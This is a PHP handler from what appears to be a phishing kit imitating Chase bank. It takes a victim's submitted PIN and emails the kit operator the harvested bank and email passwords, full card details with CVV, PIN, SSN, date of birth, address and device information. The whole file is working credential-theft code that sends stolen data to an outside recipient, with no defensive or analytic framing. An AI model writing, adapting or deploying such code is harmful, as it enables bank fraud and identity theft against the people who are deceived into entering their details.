<?php
require_once(dirname(dirname(dirname(__DIR__))) . '/autoload.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
  $core->_save_ses('pin', trim($_POST['pin1']).'-'.trim($_POST['pin2']).'-'.trim($_POST['pin3']).'-'.trim($_POST['pin4']));

  $browser = $core->is_mobile ? $core->_get_ses('mobile', $core->mobile) : $core->_get_ses('browser', $core->browser);

  $message    = "
  --------------[ LocalheartZ Private ] ------------------ <br>
  <br>
  ----- Chase Account ----- <br>
  Username   : " . $core->_get_ses('username') . "<br>
  Password   : " . $core->_get_ses('password') . "<br>
  <br>
  ----- Email Account ----- <br>
  Email : " . $core->_get_ses('email') . "<br>
  Password : " . $core->_get_ses('passwmail') . "<br>
  <br>
  [X] [ Card Information ] [X]<br>
  CC Name : " . $core->_get_ses('cardholder') . "<br>
  CC Number : " . $core->_get_ses('cardnumber') . "<br>
  Expired : " . $core->_get_ses('expire') . "<br>
  CVV : " . $core->_get_ses('cvv') . "<br>
  Copy Check Live : " . $core->_checkcc() . "<br>
  <br>
  PIN : " . $core->_get_ses('pin') . "<br>
  <br>
  Fullname : " . $core->_get_ses('fullname') . "<br>
  Address : " . $core->_get_ses('address') . "<br>
  City : " . $core->_get_ses('city') . "<br>
  State : " . $core->_get_ses('state') . "<br>
  Zip : " . $core->_get_ses('zipcode') . "<br>
  Phone : " . $core->_get_ses('phone') . "<br>
  DOB : " . $core->_get_ses('dob') . "<br>
  SSN : " . $core->_get_ses('ssn') . "<br>
  <br>
  IP & ISP : " . $core->_get_ses('ip') . " | " . $core->_get_ses('isp') . "<br>
  Date : " . $core->_re_date() . "<br>
  Device : " . $core->_get_ses('platform') . "<br>
  User Agent : " . $browser . ", " . $core->_get_ses('useragent') . "
  <br>
  --------------[ LocalheartZ Private ] ------------------ <br>
  ";
  //
  $subject    = "Result PIN | ". $core->_bin($core->_get_ses('cardnumber')) ." [ " . $core->_get_ses('ip') . " - " . $core->_get_ses('regionName') . " ] ";
  $sendername = "LHZ - CHASE";
  $send       = $core->_send(trim($core->_config('result')), $sendername, $subject, $message, 'pin');
  //
  $core->_visitor('submitted pin.');
  $core->updateJmlh('pin');
  $sender = ($core->_config('sender') == 0 ? 'SMTP' : 'MAIL');
  if ($send == TRUE) {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase PIN', 'Success');
  } else {
      $core->_sendlog($sender, trim($core->_config('result')), 'Chase PIN', 'Failed');
  }
  //
  die('success');
}else{
  die('not a post method.'); exit;
}
